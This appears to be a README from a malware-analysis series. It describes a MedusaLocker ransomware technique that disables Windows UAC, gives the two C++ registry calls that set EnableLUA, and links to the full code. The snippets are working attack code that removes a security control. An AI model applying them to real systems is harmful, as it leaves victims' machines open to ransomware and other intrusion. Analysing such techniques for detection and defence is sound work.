# MedusaLocker: Disable UAC

<p align="center">
  <img src="../../Assets/Medusa.png" alt="MedusaLocker Image" width="300px">
</p>

This TTP is used to disable UAC in the victim system and has been extracted from MedusaLocker Ransomware. It modifies registry keys to disable UAC. It requires **Admin privileges** and **Restart** to completely disable the UAC on the system. Once the testcase has successfully been executed, every process will open as admin by default.

#### Open the registry key
```c++
RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
```
#### Change the value
```c++
RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
```

Find Complete Code Click Here: [Shaddy43/MalwareAnalaysisSeries](https://github.com/shaddy43/MalwareAnalysisSeries/tree/main/MedusaLocker/Extracted_TTPs/MedusaLocker_DisableUAC)

#### Disclaimer
For educational purposes only!!!
